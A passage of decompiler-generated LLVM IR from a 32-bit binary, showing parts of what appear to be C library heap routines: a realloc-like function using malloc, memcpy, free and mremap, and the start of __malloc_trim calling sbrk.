  %v1_8050b04 = add i32 %v1_8050a85, %tmp8
  %v2_8050b04 = inttoptr i32 %v1_8050b04 to i32*
  %v3_8050b04 = load i32, i32* %v2_8050b04, align 4
  store i32 %v3_8050b04, i32* @edx, align 4
  %v1_8050b07 = add i32 %v2_8050aa3, 12
  %v2_8050b07 = inttoptr i32 %v1_8050b07 to i32*
  %v3_8050b07 = load i32, i32* %v2_8050b07, align 4
  store i32 %v3_8050b07, i32* %eax.global-to-local, align 4
  %v1_8050b0a = add i32 %v3_8050b04, 12
  %v2_8050b0a = inttoptr i32 %v1_8050b0a to i32*
  %v3_8050b0a = load i32, i32* %v2_8050b0a, align 4
  %v15_8050b0a = icmp eq i32 %v3_8050b0a, %v2_8050aa3
  %v1_8050b0d = icmp eq i1 %v15_8050b0a, false
  br i1 %v1_8050b0d, label %dec_label_pc_8050b14, label %dec_label_pc_8050b0f

dec_label_pc_8050b0f:                             ; preds = %dec_label_pc_8050b04
  %v1_8050b0f = add i32 %v3_8050b07, 8
  %v2_8050b0f = inttoptr i32 %v1_8050b0f to i32*
  %v3_8050b0f = load i32, i32* %v2_8050b0f, align 4
  %v15_8050b0f = icmp eq i32 %v3_8050b0f, %v2_8050aa3
  br i1 %v15_8050b0f, label %dec_label_pc_8050b19, label %dec_label_pc_8050b14

dec_label_pc_8050b14:                             ; preds = %dec_label_pc_8050b0f, %dec_label_pc_8050b04
  %v0_8050b14 = call i32 @abort()
  store i32 %v0_8050b14, i32* %eax.global-to-local, align 4
  %v1_8050b19.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050b19

dec_label_pc_8050b19:                             ; preds = %dec_label_pc_8050b0f, %dec_label_pc_8050b14
  %v1_8050b19 = phi i32 [ %v3_8050b04, %dec_label_pc_8050b0f ], [ %v1_8050b19.pre, %dec_label_pc_8050b14 ]
  %v0_8050b19 = phi i32 [ %v3_8050b07, %dec_label_pc_8050b0f ], [ %v0_8050b14, %dec_label_pc_8050b14 ]
  %v2_8050b19 = add i32 %v1_8050b19, 12
  %v3_8050b19 = inttoptr i32 %v2_8050b19 to i32*
  store i32 %v0_8050b19, i32* %v3_8050b19, align 4
  %v0_8050b1c = load i32, i32* @edx, align 4
  %v1_8050b1c = load i32, i32* %eax.global-to-local, align 4
  %v2_8050b1c = add i32 %v1_8050b1c, 8
  %v3_8050b1c = inttoptr i32 %v2_8050b1c to i32*
  store i32 %v0_8050b1c, i32* %v3_8050b1c, align 4
  %v0_8050bd4.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050bd4

dec_label_pc_8050b24:                             ; preds = %dec_label_pc_8050af5, %dec_label_pc_8050ae6, %dec_label_pc_8050aae
  %v1_8050b2b = add i32 %stack_var_-40.0, -7
  store i32 %v1_8050b2b, i32* %eax.global-to-local, align 4
  store i32 %v1_8050b2b, i32* %stack_var_-60, align 4
  %v1_8050b2f = call i32 @malloc(i32 %v1_8050b2b)
  store i32 %v1_8050b2f, i32* %eax.global-to-local, align 4
  %v1_8050b37 = icmp eq i32 %v1_8050b2f, 0
  store i32 %v1_8050b2f, i32* @edx, align 4
  br i1 %v1_8050b37, label %dec_label_pc_8050d03, label %dec_label_pc_8050b41

dec_label_pc_8050b41:                             ; preds = %dec_label_pc_8050b24
  %v1_8050b41 = add i32 %v1_8050b2f, -8
  store i32 %v1_8050b41, i32* %ebx.global-to-local, align 4
  %v1_8050b44 = load i32, i32* @esi, align 4
  %v12_8050b44 = icmp eq i32 %v1_8050b41, %v1_8050b44
  %v1_8050b46 = add i32 %v1_8050b2f, -4
  %v2_8050b46 = inttoptr i32 %v1_8050b46 to i32*
  %v3_8050b46 = load i32, i32* %v2_8050b46, align 4
  store i32 %v3_8050b46, i32* %eax.global-to-local, align 4
  %v1_8050b49 = icmp eq i1 %v12_8050b44, false
  br i1 %v1_8050b49, label %dec_label_pc_8050b57, label %dec_label_pc_8050b4b

dec_label_pc_8050b4b:                             ; preds = %dec_label_pc_8050b41
  store i32 %v1_8050a85, i32* @edx, align 4
  %v1_8050b4f = and i32 %v3_8050b46, -4
  store i32 %v1_8050b4f, i32* %eax.global-to-local, align 4
  %v2_8050b52 = add i32 %v1_8050b4f, %v1_8050a85
  store i32 %v2_8050b52, i32* @ebx, align 4
  br label %dec_label_pc_8050bd4

dec_label_pc_8050b57:                             ; preds = %dec_label_pc_8050b41
  %v1_8050b5b = add i32 %v1_8050a85, -4
  store i32 %v1_8050b5b, i32* %eax.global-to-local, align 4
  %v2_8050b60 = udiv i32 %v1_8050b5b, 4
  store i32 %v2_8050b60, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v1_8050b5b, 37
  br i1 %tmp23, label %dec_label_pc_8050b79, label %dec_label_pc_8050b68

dec_label_pc_8050b68:                             ; preds = %dec_label_pc_8050b57
  store i32 %v1_8050b2f, i32* %stack_var_-60, align 4
  %v3_8050b6f = inttoptr i32 %v1_8050b2f to i16*
  %v4_8050b6f = call i32 @memcpy(i16* %v3_8050b6f, i32 %tmp8, i32 %v1_8050b5b)
  store i32 %v4_8050b6f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050bc0

dec_label_pc_8050b79:                             ; preds = %dec_label_pc_8050b57
  store i32 %tmp8, i32* @esi, align 4
  %v2_8050b80 = load i32, i32* %arg1, align 4
  store i32 %v2_8050b80, i32* %eax.global-to-local, align 4
  %v2_8050b82 = inttoptr i32 %v1_8050b2f to i32*
  store i32 %v2_8050b80, i32* %v2_8050b82, align 4
  %v0_8050b84 = load i32, i32* @esi, align 4
  %v1_8050b84 = add i32 %v0_8050b84, 4
  %v2_8050b84 = inttoptr i32 %v1_8050b84 to i32*
  %v3_8050b84 = load i32, i32* %v2_8050b84, align 4
  store i32 %v3_8050b84, i32* %eax.global-to-local, align 4
  %v1_8050b87 = load i32, i32* @edx, align 4
  %v2_8050b87 = add i32 %v1_8050b87, 4
  %v3_8050b87 = inttoptr i32 %v2_8050b87 to i32*
  store i32 %v3_8050b84, i32* %v3_8050b87, align 4
  %v0_8050b8a = load i32, i32* @esi, align 4
  %v1_8050b8a = add i32 %v0_8050b8a, 8
  %v2_8050b8a = inttoptr i32 %v1_8050b8a to i32*
  %v3_8050b8a = load i32, i32* %v2_8050b8a, align 4
  store i32 %v3_8050b8a, i32* %eax.global-to-local, align 4
  %v1_8050b8d = load i32, i32* @edx, align 4
  %v2_8050b8d = add i32 %v1_8050b8d, 8
  %v3_8050b8d = inttoptr i32 %v2_8050b8d to i32*
  store i32 %v3_8050b8a, i32* %v3_8050b8d, align 4
  %tmp24 = icmp ult i32 %v1_8050b5b, 17
  br i1 %tmp24, label %dec_label_pc_8050bc0, label %dec_label_pc_8050b92

dec_label_pc_8050b92:                             ; preds = %dec_label_pc_8050b79
  %v0_8050b92 = load i32, i32* @esi, align 4
  %v1_8050b92 = add i32 %v0_8050b92, 12
  %v2_8050b92 = inttoptr i32 %v1_8050b92 to i32*
  %v3_8050b92 = load i32, i32* %v2_8050b92, align 4
  store i32 %v3_8050b92, i32* %eax.global-to-local, align 4
  %v0_8050b95 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050b98 = load i32, i32* @edx, align 4
  %v2_8050b98 = add i32 %v1_8050b98, 12
  %v3_8050b98 = inttoptr i32 %v2_8050b98 to i32*
  store i32 %v3_8050b92, i32* %v3_8050b98, align 4
  %v0_8050b9b = load i32, i32* @esi, align 4
  %v1_8050b9b = add i32 %v0_8050b9b, 16
  %v2_8050b9b = inttoptr i32 %v1_8050b9b to i32*
  %v3_8050b9b = load i32, i32* %v2_8050b9b, align 4
  store i32 %v3_8050b9b, i32* %eax.global-to-local, align 4
  %v1_8050b9e = load i32, i32* @edx, align 4
  %v2_8050b9e = add i32 %v1_8050b9e, 16
  %v3_8050b9e = inttoptr i32 %v2_8050b9e to i32*
  store i32 %v3_8050b9b, i32* %v3_8050b9e, align 4
  %tmp25 = icmp ult i32 %v0_8050b95, 7
  br i1 %tmp25, label %dec_label_pc_8050bc0, label %dec_label_pc_8050ba3

dec_label_pc_8050ba3:                             ; preds = %dec_label_pc_8050b92
  %v0_8050ba3 = load i32, i32* @esi, align 4
  %v1_8050ba3 = add i32 %v0_8050ba3, 20
  %v2_8050ba3 = inttoptr i32 %v1_8050ba3 to i32*
  %v3_8050ba3 = load i32, i32* %v2_8050ba3, align 4
  store i32 %v3_8050ba3, i32* %eax.global-to-local, align 4
  %v0_8050ba6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050ba9 = load i32, i32* @edx, align 4
  %v2_8050ba9 = add i32 %v1_8050ba9, 20
  %v3_8050ba9 = inttoptr i32 %v2_8050ba9 to i32*
  store i32 %v3_8050ba3, i32* %v3_8050ba9, align 4
  %v0_8050bac = load i32, i32* @esi, align 4
  %v1_8050bac = add i32 %v0_8050bac, 24
  %v2_8050bac = inttoptr i32 %v1_8050bac to i32*
  %v3_8050bac = load i32, i32* %v2_8050bac, align 4
  store i32 %v3_8050bac, i32* %eax.global-to-local, align 4
  %v1_8050baf = load i32, i32* @edx, align 4
  %v2_8050baf = add i32 %v1_8050baf, 24
  %v3_8050baf = inttoptr i32 %v2_8050baf to i32*
  store i32 %v3_8050bac, i32* %v3_8050baf, align 4
  %tmp26 = icmp ult i32 %v0_8050ba6, 9
  br i1 %tmp26, label %dec_label_pc_8050bc0, label %dec_label_pc_8050bb4

dec_label_pc_8050bb4:                             ; preds = %dec_label_pc_8050ba3
  %v0_8050bb4 = load i32, i32* @esi, align 4
  %v1_8050bb4 = add i32 %v0_8050bb4, 28
  %v2_8050bb4 = inttoptr i32 %v1_8050bb4 to i32*
  %v3_8050bb4 = load i32, i32* %v2_8050bb4, align 4
  store i32 %v3_8050bb4, i32* %eax.global-to-local, align 4
  %v1_8050bb7 = load i32, i32* @edx, align 4
  %v2_8050bb7 = add i32 %v1_8050bb7, 28
  %v3_8050bb7 = inttoptr i32 %v2_8050bb7 to i32*
  store i32 %v3_8050bb4, i32* %v3_8050bb7, align 4
  %v0_8050bba = load i32, i32* @esi, align 4
  %v1_8050bba = add i32 %v0_8050bba, 32
  %v2_8050bba = inttoptr i32 %v1_8050bba to i32*
  %v3_8050bba = load i32, i32* %v2_8050bba, align 4
  store i32 %v3_8050bba, i32* %eax.global-to-local, align 4
  %v1_8050bbd = load i32, i32* @edx, align 4
  %v2_8050bbd = add i32 %v1_8050bbd, 32
  %v3_8050bbd = inttoptr i32 %v2_8050bbd to i32*
  store i32 %v3_8050bba, i32* %v3_8050bbd, align 4
  br label %dec_label_pc_8050bc0

dec_label_pc_8050bc0:                             ; preds = %dec_label_pc_8050ba3, %dec_label_pc_8050b92, %dec_label_pc_8050b79, %dec_label_pc_8050b68, %dec_label_pc_8050bb4
  %v0_8050bc3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050bc3 = add i32 %v0_8050bc3, 8
  store i32 %v1_8050bc3, i32* @ebx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8050bca = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_8050cfe

dec_label_pc_8050bd4:                             ; preds = %dec_label_pc_8050a95, %dec_label_pc_8050b4b, %dec_label_pc_8050b19
  %v1_8050be5 = phi i32 [ %v1_8050a85, %dec_label_pc_8050a95 ], [ %v2_8050b52, %dec_label_pc_8050b4b ], [ %v0_8050bd4.pre, %dec_label_pc_8050b19 ]
  %v5_8050bd6 = sub i32 %v1_8050be5, %stack_var_-40.0
  store i32 %v5_8050bd6, i32* %ecx.global-to-local, align 4
  %tmp27 = icmp ult i32 %v5_8050bd6, 16
  br i1 %tmp27, label %dec_label_pc_8050bdf, label %dec_label_pc_8050bf1

dec_label_pc_8050bdf:                             ; preds = %dec_label_pc_8050bd4
  %v0_8050bdf = load i32, i32* @edi, align 4
  %v1_8050bdf = add i32 %v0_8050bdf, 4
  %v2_8050bdf = inttoptr i32 %v1_8050bdf to i32*
  %v3_8050bdf = load i32, i32* %v2_8050bdf, align 4
  %v1_8050be2 = urem i32 %v3_8050bdf, 2
  %v2_8050be5 = or i32 %v1_8050be2, %v1_8050be5
  store i32 %v2_8050be5, i32* %eax.global-to-local, align 4
  store i32 %v2_8050be5, i32* %v2_8050bdf, align 4
  %v0_8050bea = load i32, i32* @edi, align 4
  %v1_8050bea = load i32, i32* @ebx, align 4
  %v2_8050bea = add i32 %v0_8050bea, 4
  %v3_8050bea = add i32 %v2_8050bea, %v1_8050bea
  %v4_8050bea = inttoptr i32 %v3_8050bea to i32*
  %v5_8050bea = load i32, i32* %v4_8050bea, align 4
  %v6_8050bea = or i32 %v5_8050bea, 1
  store i32 %v6_8050bea, i32* %v4_8050bea, align 4
  br label %dec_label_pc_8050c21

dec_label_pc_8050bf1:                             ; preds = %dec_label_pc_8050bd4
  %v0_8050bf5 = load i32, i32* @edi, align 4
  %v2_8050bf5 = add i32 %v0_8050bf5, %stack_var_-40.0
  store i32 %v2_8050bf5, i32* %eax.global-to-local, align 4
  %v1_8050bf8 = add i32 %v0_8050bf5, 4
  %v2_8050bf8 = inttoptr i32 %v1_8050bf8 to i32*
  %v3_8050bf8 = load i32, i32* %v2_8050bf8, align 4
  %v1_8050bfb = urem i32 %v3_8050bf8, 2
  %v5_8050bfe = or i32 %v1_8050bfb, %stack_var_-40.0
  store i32 %v5_8050bfe, i32* %v2_8050bf8, align 4
  %v0_8050c08 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c0a = or i32 %v0_8050c08, 1
  store i32 %v1_8050c0a, i32* @edx, align 4
  %v1_8050c0d = load i32, i32* %eax.global-to-local, align 4
  %v2_8050c0d = add i32 %v1_8050c0d, 4
  %v3_8050c0d = inttoptr i32 %v2_8050c0d to i32*
  store i32 %v1_8050c0a, i32* %v3_8050c0d, align 4
  %v0_8050c10 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c10 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050c10 = add i32 %v0_8050c10, 4
  %v3_8050c10 = add i32 %v2_8050c10, %v1_8050c10
  %v4_8050c10 = inttoptr i32 %v3_8050c10 to i32*
  %v5_8050c10 = load i32, i32* %v4_8050c10, align 4
  %v6_8050c10 = or i32 %v5_8050c10, 1
  store i32 %v6_8050c10, i32* %v4_8050c10, align 4
  %v0_8050c15 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c15 = add i32 %v0_8050c15, 8
  store i32 %v1_8050c15, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c15, i32* %stack_var_-60, align 4
  %v1_8050c19 = call i32 @free(i32 %v1_8050c15)
  store i32 %v1_8050c19, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c21

dec_label_pc_8050c21:                             ; preds = %dec_label_pc_8050bdf, %dec_label_pc_8050bf1
  %v0_8050c21 = load i32, i32* @edi, align 4
  %v1_8050c21 = add i32 %v0_8050c21, 8
  store i32 %v1_8050c21, i32* @ebx, align 4
  br label %dec_label_pc_8050d0b

dec_label_pc_8050c29:                             ; preds = %dec_label_pc_8050a79
  store i32 %tmp8, i32* %ecx.global-to-local, align 4
  %v0_8050c2d = load i32, i32* @global_var_80606fc.194, align 4
  store i32 %v0_8050c2d, i32* %eax.global-to-local, align 4
  %v2_8050c36 = inttoptr i32 %v1_8050a7d to i32*
  %v3_8050c36 = load i32, i32* %v2_8050c36, align 4
  store i32 %v3_8050c36, i32* @ebp, align 4
  %v1_8050c39 = add i32 %v0_8050c2d, -1
  %v1_8050c3a = or i32 %stack_var_-40.0, 4
  store i32 %v1_8050c3a, i32* %stack_var_-44, align 4
  %v2_8050c40 = add i32 %v1_8050c39, %v3_8050c36
  store i32 %v2_8050c40, i32* @edx, align 4
  %v1_8050c43 = sub i32 0, %v0_8050c2d
  store i32 %v1_8050c43, i32* %eax.global-to-local, align 4
  %v2_8050c45 = add i32 %v2_8050c40, %v1_8050c3a
  %v2_8050c48 = and i32 %v2_8050c45, %v1_8050c43
  store i32 %v2_8050c48, i32* @esi, align 4
  %v2_8050c4c = sub i32 %v2_8050c48, %v3_8050c36
  store i32 %v2_8050c4c, i32* @ebx, align 4
  %v15_8050c4e = icmp eq i32 %v1_8050a85, %v2_8050c4c
  br i1 %v15_8050c4e, label %dec_label_pc_8050d07, label %dec_label_pc_8050c58

dec_label_pc_8050c58:                             ; preds = %dec_label_pc_8050c29
  %v2_8050c5a = sub i32 %v1_8050a7d, %v3_8050c36
  store i32 %v2_8050c5a, i32* @edi, align 4
  %v2_8050c61 = add i32 %v3_8050c36, %v1_8050a85
  store i32 %v2_8050c61, i32* %eax.global-to-local, align 4
  store i32 %v2_8050c5a, i32* %stack_var_-60, align 4
  %v6_8050c65 = call i32 @mremap(i32 %v2_8050c5a, i32 %v2_8050c61, i32 %v2_8050c48, i32 1, i32 %v1_8050c3a, i32 %v1_8050a85)
  store i32 %v6_8050c65, i32* %eax.global-to-local, align 4
  %v10_8050c6d = icmp eq i32 %v6_8050c65, -1
  br i1 %v10_8050c6d, label %dec_label_pc_8050cbf, label %dec_label_pc_8050c72

dec_label_pc_8050c72:                             ; preds = %dec_label_pc_8050c58
  %v1_8050c72 = load i32, i32* @ebp, align 4
  %v2_8050c72 = add i32 %v1_8050c72, %v6_8050c65
  store i32 %v2_8050c72, i32* %eax.global-to-local, align 4
  %v0_8050c74 = load i32, i32* @ebx, align 4
  %v1_8050c74 = or i32 %v0_8050c74, 2
  %v2_8050c77 = add i32 %v2_8050c72, 4
  %v3_8050c77 = inttoptr i32 %v2_8050c77 to i32*
  store i32 %v1_8050c74, i32* %v3_8050c77, align 4
  %v0_8050c7a = load i32, i32* @esi, align 4
  %v5_8050c7c = sub i32 %v0_8050c7a, %v1_8050a85
  %v0_8050c80 = load i32, i32* @global_var_8060710.198, align 16
  %v0_8050c86 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c86 = add i32 %v0_8050c86, 8
  store i32 %v1_8050c86, i32* @ebx, align 4
  %v1_8050c89 = load i32, i32* @global_var_8060704.200, align 4
  %v2_8050c89 = add i32 %v1_8050c89, %v5_8050c7c
  store i32 %v2_8050c89, i32* @global_var_8060704.200, align 4
  %tmp20 = icmp ule i32 %v2_8050c89, %v0_8050c80
  %v5_8050c9b = select i1 %tmp20, i32 %v0_8050c80, i32 %v2_8050c89
  store i32 %v5_8050c9b, i32* %ecx.global-to-local, align 4
  %v1_8050c9e = load i32, i32* @global_var_8060708.201, align 8
  %v2_8050c9e = add i32 %v1_8050c9e, %v2_8050c89
  store i32 %v5_8050c9b, i32* @global_var_8060710.198, align 16
  %v1_8050caa = load i32, i32* @global_var_8060714.202, align 4
  %tmp28 = icmp ule i32 %v2_8050c9e, %v1_8050caa
  %v5_8050cb0 = select i1 %tmp28, i32 %v1_8050caa, i32 %v2_8050c9e
  store i32 %v5_8050cb0, i32* @edx, align 4
  store i32 %v5_8050cb0, i32* @global_var_8060714.202, align 4
  br label %dec_label_pc_8050d0b

dec_label_pc_8050cbf:                             ; preds = %dec_label_pc_8050c58
  %v2_8050cbf = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8050cbf, i32* %eax.global-to-local, align 4
  %v10_8050cc2 = icmp ult i32 %v1_8050a85, %v2_8050cbf
  %v1_8050cc6 = icmp eq i1 %v10_8050cc2, false
  br i1 %v1_8050cc6, label %dec_label_pc_8050d07, label %dec_label_pc_8050cc8

dec_label_pc_8050cc8:                             ; preds = %dec_label_pc_8050cbf
  %v1_8050ccf = add i32 %stack_var_-40.0, -7
  store i32 %v1_8050ccf, i32* %eax.global-to-local, align 4
  store i32 %v1_8050ccf, i32* %stack_var_-60, align 4
  %v1_8050cd3 = call i32 @malloc(i32 %v1_8050ccf)
  store i32 %v1_8050cd3, i32* %eax.global-to-local, align 4
  %v1_8050cdb = icmp eq i32 %v1_8050cd3, 0
  store i32 %v1_8050cd3, i32* @ebx, align 4
  br i1 %v1_8050cdb, label %dec_label_pc_8050d03, label %dec_label_pc_8050ce1

dec_label_pc_8050ce1:                             ; preds = %dec_label_pc_8050cc8
  %v1_8050ce6 = add i32 %v1_8050a85, -8
  store i32 %v1_8050ce6, i32* %eax.global-to-local, align 4
  store i32 %v1_8050cd3, i32* %stack_var_-60, align 4
  %v3_8050cef = inttoptr i32 %v1_8050cd3 to i16*
  %v4_8050cef = call i32 @memcpy(i16* %v3_8050cef, i32 %tmp8, i32 %v1_8050ce6)
  store i32 %v4_8050cef, i32* %eax.global-to-local, align 4
  store i32 %v1_8050cd3, i32* @edx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8050cf9 = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_8050cfe

dec_label_pc_8050cfe:                             ; preds = %dec_label_pc_8050bc0, %dec_label_pc_8050ce1
  %storemerge = phi i32 [ %v1_8050cf9, %dec_label_pc_8050ce1 ], [ %v1_8050bca, %dec_label_pc_8050bc0 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d0b

dec_label_pc_8050d03:                             ; preds = %dec_label_pc_8050cc8, %dec_label_pc_8050b24
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050d0b

dec_label_pc_8050d07:                             ; preds = %dec_label_pc_8050cbf, %dec_label_pc_8050c29, %dec_label_pc_8050ac3
  store i32 %tmp8, i32* @ebx, align 4
  br label %dec_label_pc_8050d0b

dec_label_pc_8050d0b:                             ; preds = %dec_label_pc_8050d03, %dec_label_pc_8050cfe, %dec_label_pc_8050c72, %dec_label_pc_8050c21, %dec_label_pc_8050d07
  store i32 %v2_8050a32, i32* @eax, align 4
  store i32 %v2_8050a32, i32* %stack_var_-60, align 4
  %v2_8050d14 = call i32 @__pthread_return_void(i32 %v2_8050a32, i32 1)
  store i32 %v2_8050d14, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d19

dec_label_pc_8050d19:                             ; preds = %dec_label_pc_8050a16, %dec_label_pc_8050a02, %dec_label_pc_8050d0b
  br label %dec_label_pc_8050d1c

dec_label_pc_8050d1c:                             ; preds = %dec_label_pc_8050a50, %dec_label_pc_8050d19
  %v0_8050d1f = load i32, i32* @ebx, align 4
  store i32 %v0_8050d1f, i32* %eax.global-to-local, align 4
  store i32 %v0_80509f3, i32* %ebx.global-to-local, align 4
  store i32 %v0_80509f2, i32* @esi, align 4
  ret i32 %v0_8050d1f

; uselistorder directives
  uselistorder i32 %v1_8050cd3, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_8050caa, { 1, 0 }
  uselistorder i32 %v2_8050c9e, { 1, 0 }
  uselistorder i32 %v2_8050c89, { 0, 3, 1, 2 }
  uselistorder i32 %v0_8050c80, { 1, 0 }
  uselistorder i32 %v6_8050c65, { 1, 0, 2 }
  uselistorder i32 %v2_8050c5a, { 1, 0, 2 }
  uselistorder i32 %v1_8050c3a, { 2, 0, 1 }
  uselistorder i32 %v3_8050c36, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8050bf5, { 1, 0 }
  uselistorder i32 %v1_8050b5b, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8050b2f, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 %v2_8050ad3, { 1, 0, 2 }
  uselistorder i32 %v3_8050ae6, { 0, 2, 1 }
  uselistorder i32 %v2_8050aa3, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8050a85, { 12, 11, 13, 10, 1, 0, 7, 15, 2, 14, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_8050a7d, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_8050a72, { 1, 0 }
  uselistorder i32 %v1_8050a62, { 1, 2, 0 }
  uselistorder i32 %v0_8050a4b, { 1, 0 }
  uselistorder i32 %v2_8050a32, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp8, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 48, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 40, 41, 42, 0, 43, 44, 45, 46, 47 }
  uselistorder i32 %arg2, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8050d1c, { 1, 0 }
  uselistorder label %dec_label_pc_8050d19, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050d0b, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050cfe, { 1, 0 }
  uselistorder label %dec_label_pc_8050c21, { 1, 0 }
  uselistorder label %dec_label_pc_8050bd4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050bc0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050b19, { 1, 0 }
  uselistorder label %dec_label_pc_8050a79, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8050d29 = load i32, i32* @edx, align 4
  store i32 %v0_8050d29, i32* %ebp.global-to-local, align 4
  %v0_8050d2c = load i32, i32* @esi, align 4
  %v1_8050d31 = add i32 %v0_8050d29, 860
  %v2_8050d31 = inttoptr i32 %v1_8050d31 to i32*
  %v3_8050d31 = load i32, i32* %v2_8050d31, align 4
  store i32 %v3_8050d31, i32* @ecx, align 4
  %v1_8050d37 = add i32 %v0_8050d29, 44
  %v2_8050d37 = inttoptr i32 %v1_8050d37 to i32*
  %v3_8050d37 = load i32, i32* %v2_8050d37, align 4
  %v1_8050d3a = add i32 %v3_8050d37, 4
  %v2_8050d3a = inttoptr i32 %v1_8050d3a to i32*
  %v3_8050d3a = load i32, i32* %v2_8050d3a, align 4
  %v1_8050d3d = and i32 %v3_8050d3a, -4
  store i32 %v1_8050d3d, i32* @esi, align 4
  %v1_8050d42 = load i32, i32* @eax, align 4
  %v2_8050d42 = add i32 %v3_8050d31, -17
  %v2_8050d44 = add i32 %v2_8050d42, %v1_8050d3d
  %v3_8050d44 = sub i32 %v2_8050d44, %v1_8050d42
  %div = udiv i32 %v3_8050d44, %v3_8050d31
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8050d44, %v3_8050d31
  store i32 %tmp10, i32* @edx, align 4
  %v1_8050d4c = add i32 %div, -1
  %v4_8050d4f = mul i32 %v1_8050d4c, %v3_8050d31
  store i32 %v4_8050d4f, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8050d4f, 1
  br i1 %tmp11, label %dec_label_pc_8050dab, label %dec_label_pc_8050d56

dec_label_pc_8050d56:                             ; preds = %entry
  %v1_8050d5b = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050d5b, i32* %edi.global-to-local, align 4
  %v0_8050d65 = load i32, i32* @esi, align 4
  store i32 %v0_8050d65, i32* %eax.global-to-local, align 4
  %v1_8050d67 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050d67 = add i32 %v1_8050d67, 44
  %v3_8050d67 = inttoptr i32 %v2_8050d67 to i32*
  %v4_8050d67 = load i32, i32* %v3_8050d67, align 4
  %v5_8050d67 = add i32 %v4_8050d67, %v0_8050d65
  store i32 %v5_8050d67, i32* %eax.global-to-local, align 4
  %v12_8050d6a = icmp eq i32 %v1_8050d5b, %v5_8050d67
  %v1_8050d6c = icmp eq i1 %v12_8050d6a, false
  br i1 %v1_8050d6c, label %dec_label_pc_8050dab, label %dec_label_pc_8050d6e

dec_label_pc_8050d6e:                             ; preds = %dec_label_pc_8050d56
  %v1_8050d71 = sub i32 0, %v4_8050d4f
  store i32 %v1_8050d71, i32* @ebx, align 4
  %v1_8050d74 = call i32 @__GI_sbrk(i32 %v1_8050d71)
  store i32 %v1_8050d74, i32* %eax.global-to-local, align 4
  %v1_8050d80 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8050d80, i32* %eax.global-to-local, align 4
  %v10_8050d88 = icmp eq i32 %v1_8050d80, -1
  br i1 %v10_8050d88, label %dec_label_pc_8050dab, label %dec_label_pc_8050d8d

dec_label_pc_8050d8d:                             ; preds = %dec_label_pc_8050d6e
  %v0_8050d8d = load i32, i32* %edi.global-to-local, align 4
  %v2_8050d8f = sub i32 %v0_8050d8d, %v1_8050d80
  %v12_8050d8f = icmp eq i32 %v2_8050d8f, 0
  store i32 %v2_8050d8f, i32* @ecx, align 4
  br i1 %v12_8050d8f, label %dec_label_pc_8050dab, label %dec_label_pc_8050d93

dec_label_pc_8050d93:                             ; preds = %dec_label_pc_8050d8d
  %v0_8050d93 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050d93 = add i32 %v0_8050d93, 44
  %v2_8050d93 = inttoptr i32 %v1_8050d93 to i32*
  %v3_8050d93 = load i32, i32* %v2_8050d93, align 4
  store i32 %v3_8050d93, i32* %eax.global-to-local, align 4
  %v0_8050d96 = load i32, i32* @esi, align 4
  %v2_8050d96 = sub i32 %v0_8050d96, %v2_8050d8f
  store i32 %v2_8050d96, i32* %esi.global-to-local, align 4
  %v1_8050d98 = add i32 %v0_8050d93, 872
  %v2_8050d98 = inttoptr i32 %v1_8050d98 to i32*
  %v3_8050d98 = load i32, i32* %v2_8050d98, align 4
  %v5_8050d98 = sub i32 %v3_8050d98, %v2_8050d8f
  store i32 %v5_8050d98, i32* %v2_8050d98, align 4
